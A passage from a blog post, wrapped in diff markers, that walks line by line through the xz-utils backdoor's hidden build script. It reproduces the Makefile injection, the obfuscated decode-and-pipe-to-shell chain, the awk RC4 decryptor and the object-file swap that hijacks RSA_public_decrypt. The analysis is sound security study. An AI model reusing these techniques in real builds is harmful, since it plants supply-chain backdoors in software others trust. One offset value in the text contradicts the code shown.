+Two different checks that <a href="https://maskray.me/blog/2021-01-18-gnu-indirect-function">GNU indirect function</a> support is enabled. If not, stop the script. The backdoor requires this functionality.
+<pre>if test "x$enable_shared" != "xyes";then
+exit 0
+fi
+</pre>
+
+
+<p>
+Require shared library support.
+<pre>if ! (echo "$build" | grep -Eq "^x86_64" &gt; /dev/null 2&gt;&amp;1) &amp;&amp; (echo "$build" | grep -Eq "linux-gnu$" &gt; /dev/null 2&gt;&amp;1);then
+exit 0
+fi
+</pre>
+
+
+<p>
+Require an x86-64 Linux system.
+<pre>if ! grep -qs "$R()" $srcdir/src/liblzma/check/crc64_fast.c &gt; /dev/null 2&gt;&amp;1; then
+exit 0
+fi
+if ! grep -qs "$R()" $srcdir/src/liblzma/check/crc32_fast.c &gt; /dev/null 2&gt;&amp;1; then
+exit 0
+fi
+if ! grep -qs "$R" $srcdir/src/liblzma/check/crc_x86_clmul.h &gt; /dev/null 2&gt;&amp;1; then
+exit 0
+fi
+if ! grep -qs "$x" $srcdir/src/liblzma/check/crc_x86_clmul.h &gt; /dev/null 2&gt;&amp;1; then
+exit 0
+fi
+</pre>
+
+
+<p>
+Require all the crc ifunc code (in case it has been patched out?).
+<pre>if test "x$GCC" != 'xyes' &gt; /dev/null 2&gt;&amp;1;then
+exit 0
+fi
+if test "x$CC" != 'xgcc' &gt; /dev/null 2&gt;&amp;1;then
+exit 0
+fi
+LDv=$LD" -v"
+if ! $LDv 2&gt;&amp;1 | grep -qs 'GNU ld' &gt; /dev/null 2&gt;&amp;1;then
+exit 0
+fi
+</pre>
+
+
+<p>
+Require gcc (not clang, I suppose) and GNU ld.
+<pre>if ! test -f "$srcdir/tests/files/$p" &gt; /dev/null 2&gt;&amp;1;then
+exit 0
+fi
+if ! test -f "$srcdir/tests/files/$U" &gt; /dev/null 2&gt;&amp;1;then
+exit 0
+fi
+</pre>
+
+
+<p>
+Require the backdoor-containing test files. Of course, if these files didn’t exist, it’s unclear how we obtained this script in the first place, but better safe than sorry, I suppose.
+<pre>if test -f "$srcdir/debian/rules" || test "x$RPM_ARCH" = "xx86_64";then
+eval $zrKcst
+</pre>
+
+
+<p>
+Add a bunch of checks when the file <code>debian/rules</code> exists or <code>$RPM_ARCH</code> is set to <code>x86_64</code>. Note that we are now inside two <code>if</code> statements: the <code>config.status</code> check above, and this one (let’s call it “if #2”).
+<pre>j="^ACLOCAL_M4 = \$(top_srcdir)\/aclocal.m4"
+if ! grep -qs "$j" src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;then
+exit 0
+fi
+z="^am__uninstall_files_from_dir = {"
+if ! grep -qs "$z" src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;then
+exit 0
+fi
+w="^am__install_max ="
+if ! grep -qs "$w" src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;then
+exit 0
+fi
+E=$z
+if ! grep -qs "$E" src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;then
+exit 0
+fi
+Q="^am__vpath_adj_setup ="
+if ! grep -qs "$Q" src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;then
+exit 0
+fi
+M="^am__include = include"
+if ! grep -qs "$M" src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;then
+exit 0
+fi
+L="^all: all-recursive$"
+if ! grep -qs "$L" src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;then
+exit 0
+fi
+m="^LTLIBRARIES = \$(lib_LTLIBRARIES)"
+if ! grep -qs "$m" src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;then
+exit 0
+fi
+u="AM_V_CCLD = \$(am__v_CCLD_\$(V))"
+if ! grep -qs "$u" src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;then
+exit 0
+fi
+</pre>
+
+
+<p>
+Check that <code>liblzma/Makefile</code> contains all the lines that will be used as anchor points later for inserting new text into the Makefile.
+<pre>if ! grep -qs "$O" libtool &gt; /dev/null 2&gt;&amp;1;then
+exit 0
+fi
+</pre>
+
+
+<p>
+<code>$O</code> was set at the very start of the script. This is checking that the libtool file, presumably generated during the build process, configures the compiler for a PIC (position independent code) build.
+<pre>eval $zrKcTy
+b="am__test = $U"
+</pre>
+
+
+<p>
+<code>$U</code> was also set at the start of the script: <code>U="bad-3-corrupt_lzma2.xz"</code>. Real work is starting!
+<pre>sed -i "/$j/i$b" src/liblzma/Makefile || true
+</pre>
+
+
+<p>
+<code>sed -i</code> runs an in-place modification of the input file, in this case <code>liblzma/Makefile</code>. Specifically, find the <code>ACLOCAL_M4</code> line we grepped for earlier (<code>/$j/</code>) and insert the <code>am__test</code> setting from <code>$b</code> (<code>i$b</code>).
+<pre>d=`echo $gl_path_map | sed 's/\\\/\\\\\\\\/g'`
+b="am__strip_prefix = $d"
+sed -i "/$w/i$b" src/liblzma/Makefile || true
+</pre>
+
+
+<p>
+Shell quoting inside a quoted string inside a Makefile really is something special. This is escaping the backslashes in the tr command enough times that it will work to insert them into the Makefile after the <code>am__install_max</code> line (<code>$w</code>).
+<pre>b="am__dist_setup = \$(am__strip_prefix) | xz -d 2&gt;/dev/null | \$(SHELL)"
+sed -i "/$E/i$b" src/liblzma/Makefile || true
+b="\$(top_srcdir)/tests/files/\$(am__test)"
+s="am__test_dir=$b"
+sed -i "/$Q/i$s" src/liblzma/Makefile || true
+</pre>
+
+
+<p>
+More added lines. It’s worth stopping for a moment to look at what’s happened so far. The script has added these lines to <code>src/liblzma/Makefile</code>:
+<pre>am__test = bad-3-corrupt_lzma2.xz
+am__strip_prefix = tr "\\t \\-_" " \\t_\\-"
+am__dist_setup = $(am_strip_prefix) | xz -d 2&gt;/dev/null | $(SHELL)
+am__test_dir = $(top_srcdir)/tests/files/$(am__test)
+</pre>
+
+
+<p>
+<br>
+These look plausible but fall apart under closer examination: for example, <code>am__test_dir</code> is a file, not a directory. The goal here seems to be that after <code>configure</code> has run, the generated <code>Makefile</code> still looks plausibly inscrutable. And the lines have been added in scattered places throughout the <code>Makefile</code>; no one will see them all next to each other like in this display. Back to the script:
+<pre>h="-Wl,--sort-section=name,-X"
+if ! echo "$LDFLAGS" | grep -qs -e "-z,now" -e "-z -Wl,now" &gt; /dev/null 2&gt;&amp;1;then
+h=$h",-z,now"
+fi
+j="liblzma_la_LDFLAGS += $h"
+sed -i "/$L/i$j" src/liblzma/Makefile || true
+</pre>
+
+
+<p>
+<br>
+Add <code>liblzma_la_LDFLAGS += -Wl,--sort-section=name,-X</code> to the Makefile. If the <code>LDFLAGS</code> do not already say <code>-z,now</code> or <code>-Wl,now</code>, add <code>-z,now</code>.
+
+<p>
+The “<code>-Wl,now</code>” forces <code>LD_BIND_NOW</code> behavior, in which the dynamic loader resolves all symbols at program startup time. One reason this is normally done is for security: it makes sure that the global offset table and procedure linkage tables can be marked read-only early in process startup, so that buffer overflows or write-after-free bugs cannot target those tables. However, it also has the effect of running GNU indirect function (ifunc) resolvers at startup during that resolution process, and the backdoor arranges to be called from one of those. This early invocation of the backdoor setup lets it run while the tables are still writable, allowing the backdoor to replace the entry for <code>RSA_public_decrypt</code> with its own version. But we are getting ahead of ourselves. Back to the script:
+<pre>sed -i "s/$O/$C/g" libtool || true
+</pre>
+
+
+<p>
+We checked earlier that the libtool file said <code>pic_flag=" -fPIC -DPIC"</code>. The sed command changes it to read <code>pic_flag=" -fPIC -DPIC -fno-lto -ffunction-sections -fdata-sections"</code>.
+
+<p>
+It is not clear why these additional flags are important, but in general they disable linker optimizations that could plausibly get in the way of subterfuge.
+<pre>k="AM_V_CCLD = @echo -n \$(LTDEPS); \$(am__v_CCLD_\$(V))"
+sed -i "s/$u/$k/" src/liblzma/Makefile || true
+l="LTDEPS='\$(lib_LTDEPS)'; \\\\\n\
+    export top_srcdir='\$(top_srcdir)'; \\\\\n\
+    export CC='\$(CC)'; \\\\\n\
+    export DEFS='\$(DEFS)'; \\\\\n\
+    export DEFAULT_INCLUDES='\$(DEFAULT_INCLUDES)'; \\\\\n\
+    export INCLUDES='\$(INCLUDES)'; \\\\\n\
+    export liblzma_la_CPPFLAGS='\$(liblzma_la_CPPFLAGS)'; \\\\\n\
+    export CPPFLAGS='\$(CPPFLAGS)'; \\\\\n\
+    export AM_CFLAGS='\$(AM_CFLAGS)'; \\\\\n\
+    export CFLAGS='\$(CFLAGS)'; \\\\\n\
+    export AM_V_CCLD='\$(am__v_CCLD_\$(V))'; \\\\\n\
+    export liblzma_la_LINK='\$(liblzma_la_LINK)'; \\\\\n\
+    export libdir='\$(libdir)'; \\\\\n\
+    export liblzma_la_OBJECTS='\$(liblzma_la_OBJECTS)'; \\\\\n\
+    export liblzma_la_LIBADD='\$(liblzma_la_LIBADD)'; \\\\\n\
+sed rpath \$(am__test_dir) | \$(am__dist_setup) &gt;/dev/null 2&gt;&amp;1";
+sed -i "/$m/i$l" src/liblzma/Makefile || true
+eval $zrKcHD
+</pre>
+
+
+<p>
+Shell quoting continues to be trippy, but we’ve reached the final change. This adds the line
+<pre>AM_V_CCLD = @echo -n $(LTDEPS); $(am__v_CCLD_$(V))
+</pre>
+
+
+<p>
+to one place in the Makefile, and then adds a long script that sets up some variables, entirely as misdirection, that ends with
+<pre>sed rpath $(am__test_dir) | $(am__dist_setup) &gt;/dev/null 2&gt;&amp;1
+</pre>
+
+
+<p>
+The <code>sed rpath</code> command is just as much an obfuscated <code>cat</code> as <code>sed "r\n"</code> was, but <code>-rpath</code> is a very common linker flag, so at first glance you might not notice it’s next to the wrong command. Recalling the <code>am__test</code> and related lines added above, this pipeline ends up being equivalent to:
+<pre>cat ./tests/files/bad-3-corrupt_lzma2.xz |
+tr "\t \-_" " \t_\-" |
+xz -d |
+/bin/sh
+</pre>
+
+
+<p>
+Our old friend! We know what this does, though. It runs the very script we are currently reading in this post. <a href="https://research.swtch.com/zip">How recursive!</a>
+<a class=anchor href="#make"><h2 id="make">Make</h2></a>
+
+
+<p>
+Instead of running during <code>configure</code> in the tarball root directory, let’s mentally re-execute the script as it would run during <code>make</code> in the <code>liblzma</code> directory. In that context, the variables at the top have been set, but all the editing we just considered was skipped over by “if #1” not finding <code>./config.status</code>. Now let’s keep executing the script.
+<pre>fi
+</pre>
+
+
+<p>
+That <code>fi</code> closes “if #2”, which checked for a Debian or RPM build. The upcoming <code>elif</code> continues “if #1”, which checked for config.status, meaning now we are executing the part of the script that matters when run during <code>make</code> in the <code>liblzma</code> directory:
+<pre>elif (test -f .libs/liblzma_la-crc64_fast.o) &amp;&amp; (test -f .libs/liblzma_la-crc32_fast.o); then
+</pre>
+
+
+<p>
+If we see the built objects for the crc code, we are running as part of <code>make</code>. Run the following code.
+<pre># Entirely new in 5.6.1
+vs=`grep -broaF 'jV!.^%' $top_srcdir/tests/files/ 2&gt;/dev/null`
+if test "x$vs" != "x" &gt; /dev/null 2&gt;&amp;1;then
+f1=`echo $vs | cut -d: -f1`
+if test "x$f1" != "x" &gt; /dev/null 2&gt;&amp;1;then
+start=`expr $(echo $vs | cut -d: -f2) + 7`
+ve=`grep -broaF '%.R.1Z' $top_srcdir/tests/files/ 2&gt;/dev/null`
+if test "x$ve" != "x" &gt; /dev/null 2&gt;&amp;1;then
+f2=`echo $ve | cut -d: -f1`
+if test "x$f2" != "x" &gt; /dev/null 2&gt;&amp;1;then
+[ ! "x$f2" = "x$f1" ] &amp;&amp; exit 0
+[ ! -f $f1 ] &amp;&amp; exit 0
+end=`expr $(echo $ve | cut -d: -f2) - $start`
+eval `cat $f1 | tail -c +${start} | head -c +${end} |
+    tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377" |
+    xz -F raw --lzma2 -dc`
+fi
+fi
+fi
+fi
+</pre>
+
+
+<p>
+We start this section with another extension hook. This time the magic strings are <code>'jV!.^%'</code> and <code>'%.R.1Z'</code>. As before, there are no test files with these strings. This was for future extensibility.
+
+<p>
+On to the code shared with 5.6.0:
+<pre>eval $zrKcKQ
+if ! grep -qs "$R()" $top_srcdir/src/liblzma/check/crc64_fast.c; then
+exit 0
+fi
+if ! grep -qs "$R()" $top_srcdir/src/liblzma/check/crc32_fast.c; then
+exit 0
+fi
+if ! grep -qs "$R" $top_srcdir/src/liblzma/check/crc_x86_clmul.h; then
+exit 0
+fi
+if ! grep -qs "$x" $top_srcdir/src/liblzma/check/crc_x86_clmul.h; then
+exit 0
+fi
+</pre>
+
+
+<p>
+Check that the ifunc-enabled CRC source files look right. Interestingly, Lasse Collin renamed <code>crc_clmul.c</code> to <code>crc_x86_clmul.h</code> <a href="https://git.tukaani.org/?p=xz.git;a=commit;h=419f55f9dfc2df8792902b8953d50690121afeea">on 2024-01-11</a>. One has to assume that the person or team behind “Jia Tan” had been working on all this code well before then and that the first version checked <code>crc_clmul.c</code>. They were probably very annoyed when Lasse Collin accidentally broke their in-development backdoor by cleaning up the file names!
+<pre>if ! grep -qs "$C" ../../libtool; then
+exit 0
+fi
+if ! echo $liblzma_la_LINK | grep -qs -e "-z,now" -e "-z -Wl,now" &gt; /dev/null 2&gt;&amp;1;then
+exit 0
+fi
+</pre>
+
+
+<p>
+Check that the build configuration has the extra flags we added before.
+<pre>if echo $liblzma_la_LINK | grep -qs -e "lazy" &gt; /dev/null 2&gt;&amp;1;then
+exit 0
+fi
+</pre>
+
+
+<p>
+Check that no one has added <code>lazy</code> to the linker options, which might override the <code>-Wl,now</code>. (This code really needs to run before the tables it patches get marked read-only!)
+<pre>N=0
+W=0
+Y=`grep "dnl Convert it to C string syntax." $top_srcdir/m4/gettext.m4`
+eval $zrKcjv
+if test -z "$Y"; then
+N=0
+W=88664
+else
+N=88664
+W=0
+fi
+</pre>
+
+
+<p>
+This is selecting between two different offset values depending on the content of <code>gettext.m4</code>. The distributed xz tarballs do not contain that string in <code>gettext.m4</code> (it does appear in <code>build-to-host.m4</code>), so the <code>grep</code> finds nothing, <code>$Y</code> is the empty string, and the true case of the <code>if</code> executes: <code>N=0</code> and <code>W=88792</code>.
+<pre>xz -dc $top_srcdir/tests/files/$p | eval $i | LC_ALL=C sed "s/\(.\)/\1\n/g" |
+</pre>
+
+
+<p>
+I inserted a line break here. Remember the “corrupt” test file script set <code>i</code> to the large head pipeline? It’s still set here, being used inside the script extracted from that pipeline. Before, the pipeline extracted 33,707 bytes and then we used the final 31,233 bytes. Now we are using the entire thing, which probably means just the prefix that we skipped before. The sed command is inserting a newline after every byte of that output, setting up for piping into the remainder of the command line:
+<pre>LC_ALL=C awk '
+BEGIN{
+    FS="\n";RS="\n";ORS="";m=256;
+    for(i=0;i&lt;m;i++){t[sprintf("x%c",i)]=i;c[i]=((i*7)+5)%m;}
+    i=0;j=0;for(l=0;l&lt;8192;l++){i=(i+1)%m;a=c[i];j=(j+a)%m;c[i]=c[j];c[j]=a;}
+}
+{
+    v=t["x" (NF&lt;1?RS:$1)];
+    i=(i+1)%m;a=c[i];j=(j+a)%m;b=c[j];c[i]=b;c[j]=a;k=c[(a+b)%m];
+    printf "%c",(v+k)%m
+}' |
+</pre>
+
+
+<p>
+I inserted another line break here. What is this? <a href="https://twitter.com/nugxperience/status/1773906926503591970">@nugxperience on Twitter recognized it</a> as an RC4-like decryption function, implemented in awk! Apparently the <code>tr</code>-based substitution cipher wasn’t secure enough for this step. This is the 5.6.1 version; the 5.6.0 version is the same except that the second loop counts to 4096 instead of 8192.
+
+<p>
+Back to the script:
+<pre>xz -dc --single-stream | ((head -c +$N &gt; /dev/null 2&gt;&amp;1) &amp;&amp; head -c +$W) &gt; liblzma_la-crc64-fast.o || true
+</pre>
+
+
+<p>
+We finally made it to the end of this long line. The decrypted output is piped through xz to decompress it; the <code>--single-stream</code> flag says to stop at the end of the first xz EOF marker instead of looking for additional files on standard input. This avoids reading the section of the input that we extracted with the <code>tail</code> command before. Then the decompressed data is piped through a <code>head</code> pair that extracts either the full 88,792 byte input or zero bytes, depending on <code>gettext.m4</code> from before, and writes it to <code>liblzma_la-crc64-fast.o</code>. In our build, we are taking the full input.
+<pre>if ! test -f liblzma_la-crc64-fast.o; then
+exit 0
+fi
+</pre>
+
+
+<p>
+If all that failed, stop quietly.
+<pre>cp .libs/liblzma_la-crc64_fast.o .libs/liblzma_la-crc64-fast.o || true
+</pre>
+
+
+<p>
+Wait what? Oh! Notice the two different file names <code>crc64_fast</code> versus <code>crc64-fast</code>. And neither of these is the one we just extracted. These are in <code>.libs/</code>, and the one we extracted is in the current directory. This is backing up the real file (the underscored one) into a file with a very similar name (the hyphenated one).
+<pre>V='#endif\n#if defined(CRC32_GENERIC) &amp;&amp; defined(CRC64_GENERIC) &amp;&amp;
+    defined(CRC_X86_CLMUL) &amp;&amp; defined(CRC_USE_IFUNC) &amp;&amp; defined(PIC) &amp;&amp;
+    (defined(BUILDING_CRC64_CLMUL) || defined(BUILDING_CRC32_CLMUL))\n
+    extern int _get_cpuid(int, void*, void*, void*, void*, void*);\n
+    static inline bool _is_arch_extension_supported(void) { int success = 1; uint32_t r[4];
+    success = _get_cpuid(1, &amp;r[0], &amp;r[1], &amp;r[2], &amp;r[3], ((char*) __builtin_frame_address(0))-16);
+    const uint32_t ecx_mask = (1 &lt;&lt; 1) | (1 &lt;&lt; 9) | (1 &lt;&lt; 19);
+    return success &amp;&amp; (r[2] &amp; ecx_mask) == ecx_mask; }\n
+    #else\n
+    #define _is_arch_extension_supported is_arch_extension_supported'
+</pre>
+
+
+<p>
+This string <code>$V</code> begins with “<code>#endif</code>”, which is never a good sign. Let’s move on for now, but we’ll take a closer look at that text shortly.
+<pre>eval $yosA
+if sed "/return is_arch_extension_supported()/ c\return _is_arch_extension_supported()" $top_srcdir/src/liblzma/check/crc64_fast.c | \
+sed "/include \"crc_x86_clmul.h\"/a \\$V" | \
+sed "1i # 0 \"$top_srcdir/src/liblzma/check/crc64_fast.c\"" 2&gt;/dev/null | \
+$CC $DEFS $DEFAULT_INCLUDES $INCLUDES $liblzma_la_CPPFLAGS $CPPFLAGS $AM_CFLAGS \
+    $CFLAGS -r liblzma_la-crc64-fast.o -x c -  $P -o .libs/liblzma_la-crc64_fast.o 2&gt;/dev/null; then
+</pre>
+
+
+<p>
+This <code>if</code> statement is running a pipeline of sed commands piped into <code>$CC</code> with the arguments <code>liblzma_la-crc64-fast.o</code> (adding that object as an input to the compiler) and <code>-x</code> <code>c</code> <code>-</code> (compile a C program from standard input). That is, it rebuilds an edited copy of <code>crc64_fast.c</code> (a real xz source file) and merges the extracted malicious <code>.o</code> file into the resulting object, overwriting the underscored real object file that would have been built originally for <code>crc64_fast.c</code>. The <code>sed</code> <code>1i</code> tells the compiler the file name to record in debug info, since the compiler is reading standard input—very tidy! But what are the edits?
+
+<p>
+The file starts out looking like:
+<pre>...
+#if defined(CRC_X86_CLMUL)
+#   define BUILDING_CRC64_CLMUL
+#   include "crc_x86_clmul.h"
+#endif
+...
+static crc64_func_type
+crc64_resolve(void)
+{
+    return is_arch_extension_supported()
+            ? &amp;crc64_arch_optimized : &amp;crc64_generic;
+}
+</pre>
+
+
+<p>
+The sed commands add an <code>_</code> prefix to the name of the function in the return condition, and then add <code>$V</code> after the <code>include</code> line, producing (with reformatting of the C code):
+<pre># 0 "path/to/src/liblzma/check/crc64_fast.c"
+...
+#if defined(CRC_X86_CLMUL)
+#   define BUILDING_CRC64_CLMUL
+#   include "crc_x86_clmul.h"
+#endif
+
+#if defined(CRC32_GENERIC) &amp;&amp; defined(CRC64_GENERIC) &amp;&amp; \
+    defined(CRC_X86_CLMUL) &amp;&amp; defined(CRC_USE_IFUNC) &amp;&amp; defined(PIC) &amp;&amp; \
+    (defined(BUILDING_CRC64_CLMUL) || defined(BUILDING_CRC32_CLMUL))
+
+extern int _get_cpuid(int, void*, void*, void*, void*, void*);
+
+static inline bool _is_arch_extension_supported(void) {
+    int success = 1;
+    uint32_t r[4];
+    success = _get_cpuid(1, &amp;r[0], &amp;r[1], &amp;r[2], &amp;r[3], ((char*) __builtin_frame_address(0))-16);
+    const uint32_t ecx_mask = (1 &lt;&lt; 1) | (1 &lt;&lt; 9) | (1 &lt;&lt; 19);
+    return success &amp;&amp; (r[2] &amp; ecx_mask) == ecx_mask;
+}
+
+#else
+#define _is_arch_extension_supported is_arch_extension_supported
+#endif
+...
+static crc64_func_type
+crc64_resolve(void)
+{
+    return _is_arch_extension_supported()
+            ? &amp;crc64_arch_optimized : &amp;crc64_generic;
+}
+</pre>
+
+
+<p>
+That is, the crc64_resolve function, which is the ifunc resolver that gets run early in dynamic loading, before the GOT and PLT have been marked read-only, is now calling the newly inserted <code>_is_arch_extension_supported</code>, which calls <code>_get_cpuid</code>. This still looks like plausible code, since this is pretty similar to <a href="https://git.tukaani.org/?p=xz.git;a=blob;f=src/liblzma/check/crc_x86_clmul.h;h=ae66ca9f8c710fd84cd8b0e6e52e7bbfb7df8c0f;hb=2d7d862e3ffa8cec4fd3fdffcd84e984a17aa429#l388">the real is_arch_extension_supported</a>. But <code>_get_cpuid</code> is provided by the backdoor .o, and it does a lot more before returning the cpuid information. In particular it rewrites the GOT and PLT to hijack calls to RSA_public_decrypt.
+
+<p>
+But let’s get back to the shell script, which is still running from inside <code>src/liblzma/Makefile</code> and just successfully inserted the backdoor into <code>.libs/liblzma_la-crc64_fast.o</code>. We are now in the <code>if</code> compiler success case:
+<pre>cp .libs/liblzma_la-crc32_fast.o .libs/liblzma_la-crc32-fast.o || true
+eval $BPep
+if sed "/return is_arch_extension_supported()/ c\return _is_arch_extension_supported()" $top_srcdir/src/liblzma/check/crc32_fast.c | \
+sed "/include \"crc32_arm64.h\"/a \\$V" | \
+sed "1i # 0 \"$top_srcdir/src/liblzma/check/crc32_fast.c\"" 2&gt;/dev/null | \
+$CC $DEFS $DEFAULT_INCLUDES $INCLUDES $liblzma_la_CPPFLAGS $CPPFLAGS $AM_CFLAGS \
+    $CFLAGS -r -x c -  $P -o .libs/liblzma_la-crc32_fast.o; then
+</pre>
+
+
+<p>
+This does the same thing for <code>crc32_fast.c</code>, except it doesn’t add the backdoored object code. We don’t want two copies of that in the build. It is unclear why the script bothers to intercept both the crc32 and crc64 ifuncs; either one should have sufficed. Perhaps they wanted the dispatch code for both to look similar in a debugger. Now we’re in the doubly nested <code>if</code> compiler success case:
+<pre>eval $RgYB
+if $AM_V_CCLD$liblzma_la_LINK -rpath $libdir $liblzma_la_OBJECTS $liblzma_la_LIBADD; then
+</pre>
+
+
+<p>
+If we can relink the .la file, then...
+<pre>if test ! -f .libs/liblzma.so; then
+mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true
+mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
+fi
+</pre>
+
+
+<p>
+<br>
+If the relink succeeded but didn’t write the file, assume it failed and restore the backups.
+<pre>rm -fr .libs/liblzma.a .libs/liblzma.la .libs/liblzma.lai .libs/liblzma.so* || true
+</pre>
+
+
+<p>
+No matter what, remove the libraries. (The <code>Makefile</code> link step is presumably going to happen next and recreate them.)
+<pre>else
+mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true
+mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
+fi
+</pre>
+
+
+<p>
+This is the <code>else</code> for the link failing. Restore from backups.
+<pre>rm -f .libs/liblzma_la-crc32-fast.o || true
+rm -f .libs/liblzma_la-crc64-fast.o || true
+</pre>
+
+
+<p>
+Now we are in the inner compiler success case. Delete backups.
+<pre>else
+mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true
+mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
+fi
+</pre>
+
+
+<p>
+This is the else for the crc32 compilation failing. Restore from backups.
+<pre>else
+mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
+fi
+</pre>
+
+
+<p>
+This is the else for the crc64 compilation failing. Restore from backup. (This is not the cleanest shell script in the world!)
+<pre>rm -f liblzma_la-crc64-fast.o || true
+</pre>
+
+
+<p>
+Now we are at the end of the Makefile section of the script. Delete the backup.
+<pre>fi
+eval $DHLd
+$
+</pre>
+
+
+<p>
+Close the “<code>elif</code> we’re in a Makefile”, one more extension point/debug print, and we’re done!
+The script has injected the object file into the objects built during <code>make</code>, leaving no trace behind.
+      </div>
+    </div>
+  </body>
+</html>
+
+
+
+
+
+
+
